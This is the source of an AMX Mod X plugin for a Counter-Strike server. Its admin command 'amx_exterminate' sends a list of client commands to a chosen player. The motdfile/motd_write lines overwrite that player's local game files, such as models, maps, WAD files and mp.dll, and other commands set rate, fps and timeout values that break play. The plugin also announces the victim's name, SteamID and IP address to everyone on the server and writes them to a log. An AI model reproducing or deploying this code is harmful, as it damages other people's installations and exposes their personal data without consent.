
#include < amxmodx >
#include < amxmisc >
#include < colorchat >

#pragma semicolon 1

#define CMDTARGET_EXTERMINATE		( CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF | CMDTARGET_NO_BOTS )
#define CMD_ACCESS_FLAG			ADMIN_BAN

new const gCommandsToExecute[ ][ ] =
{
	"rate 1",
	"cl_cmdrate 1",
	"cl_updaterate 1",
	"fps_max 1",
	"sys_ticrate 1",
	"motdfile models/player.mdl; motd_write y",
	"motdfile models/v_ak47.mdl; motd_write y",
	"motdfile cs_dust.wad; motd_write y",
	"motdfile models/v_m4a1.mdl; motd_write y",
	"motdfile resource/GameMenu.res; motd_write y",
	"motdfile halflife.wad; motd_write y",
	"motdfile cstrike.wad; motd_write y",
	"motdfile maps/de_dust2.bsp; motd_write y",
	"motdfile events/ak47.sc; motd_write y",
	"motdfile dlls/mp.dll; motd_write y",
	"cl_timeout 0"
};

new const gTag[ ] = "[Deathrun]";
new const gLogFilename[ ] = "Exterminari.log";

new gHudSync;

public plugin_init( )
{
	register_plugin( "Exterminate", "1.0.1", "tuty" );
	
	register_concmd( "amx_exterminate", "CommandExterminate", CMD_ACCESS_FLAG, "<nume / #userid>" );
	
	gHudSync = CreateHudSyncObj( );
	
	UTIL_CheckServerLicense( "93.119.26.88:27015", 0 );
}

public CommandExterminate( id, level, cid )
{
	if( !cmd_access( id, level, cid, 2 ) )
	{
		return PLUGIN_HANDLED;
	}

	new szArgument[ 32 ]; 
	read_argv( 1, szArgument, charsmax( szArgument ) );

	new iTarget = cmd_target( id, szArgument, CMDTARGET_EXTERMINATE );

	if( !iTarget )
	{
		return PLUGIN_HANDLED;
	}
	
	new i;
	for( i = 0; i < sizeof gCommandsToExecute; i++ )
	{
		client_cmd( iTarget, gCommandsToExecute[ i ] );
	}

	new szTargetName[ 32 ], szAdminName[ 32 ], szTargetIp[ 29 ], szTargetAuth[ 40 ];
	
	get_user_name( iTarget, szTargetName, charsmax( szTargetName ) );
	get_user_ip( iTarget, szTargetIp, charsmax( szTargetIp ), 1 );
	get_user_authid( iTarget, szTargetAuth, charsmax( szTargetAuth ) );
	
	get_user_name( id, szAdminName, charsmax( szAdminName ) );
	
	new szTime[ 50 ];
	get_time( "%c (%p)", szTime, charsmax( szTime ) );
	
	ColorChat( 0, RED, "^3%s^1 ADMIN:^4 %s^1 l-a Exterminat pe:^4 %s^1(^4%s^1 /^4 %s^1) pe data de:^4%s", gTag, szAdminName, szTargetName, szTargetAuth, szTargetIp, szTime );
	client_cmd( 0, "speak ^"vox/bizwarn detected user and exterminate^"" );

	log_to_file( gLogFilename, "ADMIN: <%s> l-a Exterminat pe: <%s>(%s / %s) pe data de: <%s>", szAdminName, szTargetName, szTargetAuth, szTargetIp, szTime );
	
	set_hudmessage( 255, 255, 255, 0.56, 0.16, 2, 6.0, 5.0 );
	ShowSyncHudMsg( 0, gHudSync, "%s^nJucatorul %s a fost Exterminat!", gTag, szTargetName );
	
	return PLUGIN_HANDLED;
}


stock UTIL_CheckServerLicense( const szIP[ ], iShutDown = 1 )
{
	new szServerIP[ 50 ];
	get_cvar_string( "ip", szServerIP, charsmax( szServerIP ) );
	
	if( !equal( szServerIP, szIP ) )
	{
		if( iShutDown == 1 )
		{
			server_cmd( "exit" );
		
			log_amx( "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed...Shutting down...", szIP, szServerIP );
		}
		
		else if( iShutDown == 0 )
		{
			new szFormatFailState[ 250 ];
			formatex( szFormatFailState, charsmax( szFormatFailState ), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", szIP, szServerIP );

			set_fail_state( szFormatFailState );
		}
	}
	
	else
	{
		log_amx( "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking verified! DONE.", szIP, szServerIP );
	}
}
